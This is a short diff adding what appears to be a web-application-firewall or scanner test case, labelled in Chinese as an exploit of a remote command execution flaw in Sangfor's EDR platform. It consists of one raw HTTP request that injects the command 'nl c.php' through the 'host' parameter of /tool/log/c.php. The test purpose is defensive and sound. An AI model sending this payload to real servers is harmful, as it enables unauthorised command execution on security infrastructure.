@@ -1,0 +1,9 @@
+# 利用【深信服终端监测响应平台（EDR）远程命令执行漏洞】-30000110
+# 深信服终端监测响应平台（EDR）远程命令执行漏洞。
+GET /tool/log/c.php?acid=30000110&strip_slashes=printf&host=nl+c.php&bid=hd_tag_m8mv25bb HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25bb
+RM-PRO-Token: c286635ab4779a7d56130c0222860e0c
+RM-PRO-Time: 1742808458035
+User-Agent: curl/7.83.1
+
